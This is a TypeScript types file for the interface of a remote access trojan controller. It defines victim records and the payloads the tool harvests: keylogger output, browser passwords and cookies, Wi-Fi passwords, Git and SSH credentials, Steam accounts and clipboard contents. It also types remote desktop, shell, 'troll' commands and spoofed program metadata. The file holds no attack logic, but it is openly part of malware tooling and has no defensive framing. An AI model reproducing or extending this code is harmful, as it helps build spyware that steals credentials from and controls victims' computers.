import React from "react";
import { Window } from "@tauri-apps/api/webview";

export type RATState = {
  running: boolean;
  port: string;
};

export type RATContextType = {
  port: string;
  setPort: (port: string) => void;
  setRunning: (running: boolean) => void;
  running: boolean;
  clientList: Array<RATClient>;
  setClientList: (clientList: Array<RATClient>) => void;
  setSelectedClient: (client: string) => void;
  selectedClient: string;
  setNotificationClient: (notificationClient: boolean) => void;
  notificationClient: boolean;
  openClientWindow: (
    addr: string,
    type: string,
    clientFullName: string
  ) => Promise<Window | undefined>;
  serverLogs: Array<Log>;
  getClientByAddr: (addr: string) => Promise<RATClient | undefined>;
  autoUploadAnonFiles: boolean;
  setAutoUploadAnonFiles: (autoUpload: boolean) => void;
};

export interface RATProviderProps {
  children: React.ReactNode;
}

export interface RATClient {
  data: ClientData;
  system: SystemInfo;
  ram: RamInfo;
  cpu: CpuInfo;
  bios: BiosInfo;
  gpus: GpuInfo[];
  displays: number;
  drives: PhysicalDrive[];
  unique: UniqueInfo;
  security: SecurityInfo;
}

export interface ClientData {
  uuidv4: string;
  addr: string;
  reverse_proxy_port: string;
  disconnected?: boolean;
  group: string;
  country_code: string;
}

export interface BiosInfo {
  manufacturer: string;
  description: string;
  serial_number: string;
  version: string;
}

export interface CpuInfo {
  cpu_name: string;
  logical_processors: number;
  processor_family?: string;
  manufacturer?: string;
  clock_speed_mhz: number;
  description?: string;
}

export interface PhysicalDrive {
  model: string;
  size_gb: number;
}

export interface GpuInfo {
  name: string;
  driver_version?: string;
}

export interface RamInfo {
  total_gb: number;
  used_gb: number;
}

export interface SecurityInfo {
  firewall_enabled: boolean;
  antivirus_names: string[];
}

export interface SystemInfo {
  username: string;
  machine_name: string;
  system_model: string;
  system_manufacturer: string;
  os_full_name: string;
  os_version: string;
  os_serial_number: string;
  is_elevated: boolean;
}

export interface UniqueInfo {
  mac_address: string;
  volume_serial: string;
}

export type ClientWindowType = {
  id: string;
  addr: string;
  window: Window;
  type: string;
};

export type ContextMenuType = {
  x: number;
  y: number;
  addr: string;
  clientFullName: string;
};

export interface ContextMenuProps {
  x: number;
  y: number;
  addr: string;
  onClose: () => void;
  clientFullName: string;
}

export type MenuOptionType = {
  label: string;
  icon: React.ReactNode;
  optionType?: OptionType;
  type?: string;
  options?: MenuOptionType[];
  run?: string;
  function?: (string?, string?) => void;
  modalId?: string;
};

interface SubMenuProps {
  items: MenuOptionType[];
  top: number;
  left: number;
  addr: string;
  clientFullName: string;
  onClose: () => void;
}

export interface ShellCommandType {
  command: string;
  output: React.JSX.Element | string;
}

export interface CommandProps {
  addr: string;
}

export type ProcessType = {
  pid: string;
  name: string;
};

export type FileType = {
  file_type: string;
  name: string;
};

export type Log = {
  event_type: string;
  message: string;
  time: string;
};

export type AssemblyInfo = {
  assembly_name: string;
  assembly_description: string;
  assembly_company: string;
  assembly_copyright: string;
  assembly_trademarks: string;
  assembly_original_filename: string;
  assembly_product_version: string;
  assembly_file_version: string;
};

export type OnionServiceInfo = {
  nickname: string;
  onion_address: string;
  port: number;
  status?: string;
};

export type WindowWrapperProps = {
  feature_cleanup: (params: Record<string, string | undefined>) => void;
};

export type FilterCategories = {
  group: Record<string, boolean>;
  os: Record<string, boolean>;
  cpu: Record<string, boolean>;
  gpus: Record<string, boolean>;
};

export interface TableFilterProps {
  searchTerm: string;
  setSearchTerm: (term: string) => void;
  searchPlaceholder?: string;
  filters: Record<string, Record<string, boolean>> | Record<string, boolean>;
  setFilters: (filters: any) => void;
  filterCategories?: string[];
  activeFilterCategory?: string;
  setActiveFilterCategory?: (category: string) => void;
}

export interface RemoteDesktopFramePayload {
  addr: string;
  timestamp: number;
  display: number;
  data: string;
}

export enum TrollCommandType {
  HideDesktop = "HideDesktop",
  ShowDesktop = "ShowDesktop",
  HideTaskbar = "HideTaskbar",
  ShowTaskbar = "ShowTaskbar",
  HideNotify = "HideNotify",
  ShowNotify = "ShowNotify",
  FocusDesktop = "FocusDesktop",
  EmptyTrash = "EmptyTrash",
  RevertMouse = "RevertMouse",
  NormalMouse = "NormalMouse",
  MonitorOff = "MonitorOff",
  MonitorOn = "MonitorOn",
  MaxVolume = "MaxVolume",
  MinVolume = "MinVolume",
  MuteVolume = "MuteVolume",
  UnmuteVolume = "UnmuteVolume",
  SpeakText = "SpeakText",
  Beep = "Beep",
  PianoKey = "PianoKey",
}

export type TrollCommand = {
  type: TrollCommandType;
  payload?: any;
};

export interface KeyloggerUpdatePayload {
  addr: string;
  window: string;
  data: string;
}

export interface KeyloggerOfflineLogsPayload {
  addr: string;
  logs: string[];
}

export interface PasswordEntry {
  url: string;
  username: string;
  password: string;
}

export interface CookieEntry {
  domain: string;
  name: string;
  value: string;
  path: string;
  expires: string;
}

export interface HistoryEntry {
  url: string;
  title: string;
  visit_count: number;
  last_visit: string;
}

export interface BookmarkEntry {
  url: string;
  title: string;
}

export interface BrowserResult {
  name: string;
  passwords: PasswordEntry[];
  cookies: CookieEntry[];
  history: HistoryEntry[];
  bookmarks: BookmarkEntry[];
}

export interface BrowserDataPayload {
  addr: string;
  data: {
    browsers: BrowserResult[];
  };
}

export interface WifiProfile {
  ssid: string;
  password: string;
  authentication: string;
  cipher: string;
}

export interface WifiDataPayload {
  addr: string;
  data: {
    profiles: WifiProfile[];
  };
}

export interface SoftwareEntry {
  name: string;
  version: string;
  publisher: string;
  install_location: string;
  uninstall_command: string;
  executable_path: string;
  icon_base64: string;
}

export interface SoftwareInventoryPayload {
  addr: string;
  data: {
    applications: SoftwareEntry[];
  };
}

export interface GitCredentialEntry {
  source: string;
  path: string;
  url: string;
  username: string;
  password: string;
  raw: string;
}

export interface ExtractedFile {
  path: string;
  contents: string;
}

export interface GitDataPayload {
  addr: string;
  data: {
    credentials: GitCredentialEntry[];
    configs: ExtractedFile[];
  };
}

export interface SSHDataPayload {
  addr: string;
  data: {
    files: ExtractedFile[];
  };
}

export interface SteamAccountEntry {
  steam_id: string;
  account_name: string;
  persona_name: string;
  remember_password: string;
  last_logon: string;
  details: string;
}

export interface SteamDataPayload {
  addr: string;
  data: {
    accounts: SteamAccountEntry[];
    files: ExtractedFile[];
  };
}

export interface ClipboardUpdatePayload {
  addr: string;
  data: {
    text: string;
  };
}

export interface NotificationEventPayload {
  addr: string;
  data: {
    source: string;
    title: string;
    message: string;
    timestamp: string;
  };
}

export interface SoftwareIconResultPayload {
  addr: string;
  data: {
    name: string;
    icon_base64: string;
  };
}

export interface SoftwareActionResultPayload {
  addr: string;
  data: {
    name: string;
    success: boolean;
    message: string;
  };
}
